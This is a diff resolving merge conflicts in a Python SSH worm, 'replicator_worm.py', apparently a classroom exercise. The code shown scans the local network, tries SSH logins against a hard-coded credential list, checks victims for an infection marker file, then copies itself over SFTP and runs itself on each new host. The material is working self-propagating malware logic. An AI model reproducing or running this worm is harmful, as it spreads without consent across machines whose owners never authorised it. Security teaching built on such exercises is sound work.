@@ -16,12 +16,8 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
-<<<<<<< HEAD
 ORIGIN_IP = "192.168.1.3"
-=======
-AttackIP=[]
 
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
@@ -83,7 +79,7 @@ def spreadAndExecute(sshClient,systemIP1):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-<<<<<<< HEAD
+
 	if systemIP1 != ORIGIN_IP:
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
 
@@ -94,14 +90,6 @@ def spreadAndExecute(sshClient,systemIP1):
 
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py")
-=======
-	if len(sys.argv) < 2:
-		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
-	else:
-		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
-	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
-	sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 	
 
 ############################################################
@@ -288,17 +276,6 @@ if systemIP != ORIGIN_IP:
 	# Let's mark it.
 	else:
 		markInfected()
-	
-# TODO: Get the IP of the current system
-#interface = netifaces.interfaces()
-
-<<<<<<< HEAD
-#systemIP = unicode(getMyIP(interface),"utf-8")
-#print("System IP is " + systemIP )
-=======
-systemIP = getMyIP(interface)
-print("System IP is " + systemIP)
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -309,25 +286,14 @@ print networkHosts
 # from the list of discovered systems (we
 # do not want to target ourselves!
 
-if len(sys.argv) >= 2:
-	AttackIP.append(systemIP)
-
 attackList = []
 temp = []
 
 for targetHost,j in enumerate(networkHosts):
-<<<<<<< HEAD
 	if networkHosts[targetHost] != systemIP and networkHosts[targetHost] != ORIGIN_IP:
-		HostToAttck.append(networkHosts[targetHost])
-	#Try to attack this host
-print "Found hosts: To attack", HostToAttck
-=======
-	if networkHosts[targetHost] != systemIP:
 		attackList.append(networkHosts[targetHost])
-print "Found Hosts to attack: ", attackList
-if(AttackIP.length > 0):
-	attackList.remove(AttackIP)
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
+	#Try to attack this host
+print "Found hosts: To attack", attackList
 
 
 # Go through the network hosts
@@ -338,10 +304,6 @@ for host in attackList:
 	
 	print sshInfo
 	
-<<<<<<< HEAD
-=======
-	
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 	# Did the attack succeed?
 	if sshInfo:
 		
@@ -392,19 +354,12 @@ for host in attackList:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
-<<<<<<< HEAD
 			print("We are going to spread ")
 			spreadAndExecute(sshInfo[0], systemIP)
 			
 			# MIG: If we just infected the system, we should
 			# exit.
 			exit(1)
-=======
-			print("inside if isInfectedSytem() statement ")
-			spreadAndExecute(sshInfo[0])
-			print("done infecting")
-			exit()
-			
->>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
+
 
 
